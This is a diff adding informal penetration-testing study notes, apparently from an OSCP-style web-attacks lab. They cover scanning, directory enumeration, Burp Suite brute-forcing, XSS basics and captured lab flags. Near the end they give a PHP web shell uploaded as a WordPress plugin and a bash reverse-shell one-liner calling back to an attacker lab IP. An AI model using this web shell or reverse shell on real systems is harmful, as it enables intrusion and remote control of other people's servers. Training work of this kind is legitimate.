@@ -1,0 +1,141 @@
+Introduction to Web Application Attacks
+
+Web Application Assessment Methodology
+
+White-box testing
+black-box testing
+Grey-box testing
+
+Web Application Assessment Tools
+
+sudo nmap -p80  -sV 192.168.50.20
+sudo nmap -p80 --script=http-enum 192.168.50.20
+
+Wappalyzer
+
+Gobuster
+gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5\
+(-t number of concurrent threads)
+
+Burp Suite proxy
+127.0.0.1:8080
+import certificate
+captive portal
+repeater, request, response
+
+intruder
+301
+8080
+
+----------
+attacker 192.168.49.57
+target 192.168.57.52
+admin/admin
+
+gobuster dir -u 192.168.57.52 -w /usr/share/wordlists/dirb/common.txt -t 5\
+portal               (Status: 301) [Size: 315] [--> http://192.168.57.52/portal/]
+
+192.168.57.52/portal
+OS{0744a2b4a622dd006aecd1e21974d93f}
+
+--------
+target 192.168.57.52
+
+curl -O 192.168.57.52/passwords.txt
+
+http://192.168.57.52/login.php
+admin/?
+
+username=admin&password= test &debug=0
+intruder, runtime file
+zeddemore length: 328
+
+OS{e21ad69aee7ceaec769dbc360b47db6b}
+
+------
+Cross-Site Scripting
+
+Basic XSS
+
+Stored
+Reflected
+DOM-based
+
+Web Developer console
+< > ' " { } ;
+ 
+HTML encoding
+< becomes &lt; or &#60;
+> becomes &gt; or &#62;
+& becomes &amp; or &#38;
+" becomes &quot; or &#34;
+' becomes &apos; or &#39; 
+
+User-Agent
+<script>alert(42)</script>
+
+Privilege Escalation via XSS
+
+cookies:
+Secure flag instructs the browser to only send the cookie over encrypted connections
+HttpOnly flag instructs the browser to deny JavaScript access to the cookie
+
+Web Developer Storage, Cookies
+
+Ref:
+https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
+https://developer.wordpress.org/reference/functions/wp_nonce_field/
+https://owasp.org/www-community/attacks/csrf
+https://jscompress.com/
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
+
+attacker 192.168.49.57
+target 192.168.57.16
+admin/password
+
+https://medium.com/@bil3l/one-day-no-sleep-my-struggle-and-victory-in-oscps-capstone-lab-466990068cc1
+
+wpscan --url 192.168.57.16 --enumerate ap,u,t
+
+/etc/hosts
+192.168.57.16 offsecwp
+
+offsecwp/wp-admin
+offsecwp/wp-login.php
+
+Visitors plugin installed
+
+shell_plugin.php:
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+
+zip shell_plugin.zip shell_plugin.php
+
+plugin installed failed !
+
+http://offsecwp/wp-content/plugins/shell_plugin.php?cmd=id
+
+nc -lvnp 4444
+
+http://offsecwp/wp-content/plugins/shell_plugin/shell_plugin.php?cmd=bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/192.168.49.57/4444%200%3E&1%27
+
+/tmp/flag.txt?
+
+
+
+
+
+
+
+
+
+
+
+
+
+
